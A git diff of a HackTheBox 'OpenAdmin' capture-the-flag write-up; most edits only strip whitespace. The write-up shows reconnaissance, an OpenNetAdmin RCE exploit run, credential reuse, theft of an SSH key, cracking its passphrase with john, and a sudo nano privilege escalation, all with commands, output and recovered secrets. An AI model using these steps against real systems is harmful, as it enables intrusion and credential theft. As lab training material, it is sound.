@@ -9,7 +9,7 @@ published: true
 
 # 0x0 Introduction
 The first HackTheBox Maschine I ever owned, featuring OpenNetAmin and typical admin mistakes
-![image](/assets/images/openadmin-thumb.png "Openadmin Logo")
+![image](/images/openadmin-thumb.png "Openadmin Logo")
 
 0x1 getting a Foothold
 
@@ -21,7 +21,7 @@ Host is up (0.0058s latency).
 Not shown: 998 closed ports
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
 |   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
 |_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
@@ -35,7 +35,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 
 ssh is not all that intresting as the attack surface there is rather low. so I decieded to look at the web site hosted at port 80
-and found the Apache default page, just like nmap already told us but it never hurts to look ourselfs.  
+and found the Apache default page, just like nmap already told us but it never hurts to look ourselfs.
 Hoping to find other intresting endpoints on the Website I decided to run gobuster against it:
 
 ```
@@ -91,7 +91,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 ```
 
-This time we found /sierra and /ona, so there is new hope (and this time gobuster also informed me about the .htaccess).  
+This time we found /sierra and /ona, so there is new hope (and this time gobuster also informed me about the .htaccess).
 On /sierra we also find a lot of lorem-ipsum text but the /ona endpoint proved to be very interesting because it showed us that OpenNetAdmin is running on the box (something I have personally never heard of before), and it also tells us that it is an outdated version of OpenNetAdmin. A google search for 'OpenNetAdmin 18.1.1 Exploit' came back with an RCE as the first result.
 
 ```
@@ -120,7 +120,7 @@ while true;do
 done
 ```
 
-Copied that into a local file and we are ready to use it. 
+Copied that into a local file and we are ready to use it.
 
 ```
 mindslave@kalibox:~/hackthebox/OpenAdmin$ ./exploit.sh 10.10.10.171/ona/
@@ -128,10 +128,10 @@ $ whoami
 www-data
 ```
 
-# 0x2 Getting the user.txt 
+# 0x2 Getting the user.txt
 
-Now this part of the box took really, and I mean really, long for me.  
-The first useful thing I found by looking at /etc/home is that there  
+Now this part of the box took really, and I mean really, long for me.
+The first useful thing I found by looking at /etc/home is that there
 are 2 users jimmy and joanna
 from looking at the /etc/passwd we could also learn that jimmy is the admin for the apache server
 
@@ -151,11 +151,11 @@ And I also found these database credentials
 <?php
 
 $ona_contexts=array (
-  'DEFAULT' => 
+  'DEFAULT' =>
   array (
-    'databases' => 
+    'databases' =>
     array (
-      0 => 
+      0 =>
       array (
         'db_type' => 'mysqli',
         'db_host' => 'localhost',
@@ -175,7 +175,7 @@ And ofcoure jimmy reused this database password for his user account, which mean
 
 ```
 mindslave@kalibox:~$ ssh jimmy@10.10.10.171
-jimmy@10.10.10.171's password: 
+jimmy@10.10.10.171's password:
 Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -201,12 +201,12 @@ Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your 
 
 
 Last login: Fri Feb  7 05:39:24 2020 from 10.10.14.147
-jimmy@openadmin:~$   
+jimmy@openadmin:~$
 ```
 
 Now as Jimmy we want to find out which files belong to us and since all the interesting stuff seems to be in /var we do
 ```
-find /var -user jimmy 
+find /var -user jimmy
 ```
 
 which reveals:
@@ -220,7 +220,7 @@ which reveals:
 main.php looked extremly interesting
 
 ```php
-<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
+<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); };
 # Open Admin Trusted
 # OpenAdmin
 $output = shell_exec('cat /home/joanna/.ssh/id_rsa');
@@ -233,7 +233,7 @@ Click here to logout <a href="logout.php" tite = "Logout">Session
 ```
 
 This file is trying to output joanna's ssh key, which we would obviously be interested in.
-running it with a simple "php main.php" we just get a permission denied tho. 
+running it with a simple "php main.php" we just get a permission denied tho.
 I then tried to access these files via the browser but could not find them on 10.10.10.171/main.php
 neither 10.10.10.171/internal/main.php, which after a while got me thinking that they might be runnig on a different port
 
@@ -241,14 +241,14 @@ neither 10.10.10.171/internal/main.php, which after a while got me thinking that
 (Not all processes could be identified, non-owned process info
  will not be shown, you would have to be root to see it all.)
 Active Internet connections (only servers)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name             
-tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
-tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
-tcp6       0      0 :::80                   :::*                    LISTEN      -                   
-tcp6       0      0 :::22                   :::*                    LISTEN      -                   
-udp        0      0 127.0.0.53:53           0.0.0.0:*                           - 
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
 ```
 
 Which turned out to be correct, the /internal pages are running on port 52846 and a simple curl gave us the ssh key
@@ -301,7 +301,7 @@ First convert the file into john-readable format:
 Now we can use this john to recover the password from the johnfile.
 
 ```
-mindslave@kalibox:~/hackthebox/OpenAdmin/ssh$ john --wordlist=/usr/share/wordlists/rockyou.txt johnfile.txt 
+mindslave@kalibox:~/hackthebox/OpenAdmin/ssh$ john --wordlist=/usr/share/wordlists/rockyou.txt johnfile.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
 Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
@@ -321,7 +321,7 @@ and we found the password: "bloodninjas". This enabled us log in as Joanna and g
 ```
 joanna@openadmin:~$ ls
 user.txt
-joanna@openadmin:~$ cat user.txt 
+joanna@openadmin:~$ cat user.txt
 c9b2cf07d40807e62af62660f0c81b5f
 ```
 
@@ -329,24 +329,24 @@ c9b2cf07d40807e62af62660f0c81b5f
 
 This was acctually easier than getting the user, once you are logged in with joanna do:
 ```
-joanna@openadmin:~$ sudo -l                                                             
-Matching Defaults entries for joanna on openadmin:                                           
-    env_reset, mail_badpass,                                                                 
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 
-                                                                                             
-User joanna may run the following commands on openadmin:                                           
+joanna@openadmin:~$ sudo -l
+Matching Defaults entries for joanna on openadmin:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User joanna may run the following commands on openadmin:
     (ALL) NOPASSWD: /bin/nano /opt/priv
 ```
 
-you can open the /opt/priv with nano as root without getting prompted for a password, once you open nano on that file  
-you can instruct nano to read the /root/root.txt, which since it runs as root it will do without complains.  
+you can open the /opt/priv with nano as root without getting prompted for a password, once you open nano on that file
+you can instruct nano to read the /root/root.txt, which since it runs as root it will do without complains.
 
 ```
 2f907ed450b361b2c2bf4e8795d5b561
 ```
 
-And that is it, instead of opening the root.txt you could also edit the /etc/passwd or the sudoers file to actually become a root user.  
-At this point we have owned the box.  
+And that is it, instead of opening the root.txt you could also edit the /etc/passwd or the sudoers file to actually become a root user.
+At this point we have owned the box.
 This was my first Box on HTB and it won't be the last!
 
 
